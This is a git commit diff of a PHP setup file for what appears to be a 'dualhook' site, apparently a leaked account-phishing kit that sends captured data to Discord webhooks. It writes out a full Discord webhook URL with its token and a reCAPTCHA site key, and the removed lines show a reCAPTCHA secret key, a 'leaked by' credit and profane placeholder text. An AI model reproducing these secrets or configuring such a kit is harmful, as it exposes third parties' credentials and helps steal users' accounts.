2fa14422a2d52e166588a3ac0baaf553bef8d51b
NukeVsCity <126271308+NukeVsCity1@users.noreply.github.com>
2023-09-04 00:31:48 +0800

    Update Setup.php

--- Setup.php
+++ Setup.php
@@ -1,15 +1,9 @@
 <?php
-// Leaked by fro#1337 
-$siteName = "coen";
-$webText = htmlspecialchars("SHUT THE FUCK UP");
 $recaptcha_sitekey = "6Le3r6YhAAAAAOZMXlzs-cg-bIoyzTbVTtMQwcOS";
-$recaptcha_secretkey = "6Le3r6YhAAAAAC3nYqVxLBYNul_7e6cGGJFaxGE-";
+$siteName = "coenrizz";
+$webText = htmlspecialchars("New Account");
 $dualhook = "https://discord.com/api/webhooks/1135168059217293364/EDjvXnKwEqBcdnljhBnaO5meZFAd5aCETwtP1Nwe_kx7yonMiqXsTmsqzzuBC7tCa-JZ";
 $mainpfp = "https://cdn.discordapp.com/attachments/1135168013419675651/1147905280269635665/Screenshot_2023-08-28-14-09-15-164_com.garena.game.codm.jpg";
-$embedColor = "386acf"; #WITHOUT HASHTAG
-/* controller info*/
-//Example: TEST-A1B2C3D4E5
-$controllerpath = "coen";
-//ur discord should be like https://discord.gg/invite/sex
+$embedColor = "386acf";
 $discord = "https://discord.gg/5SprK4cs";
 ?>
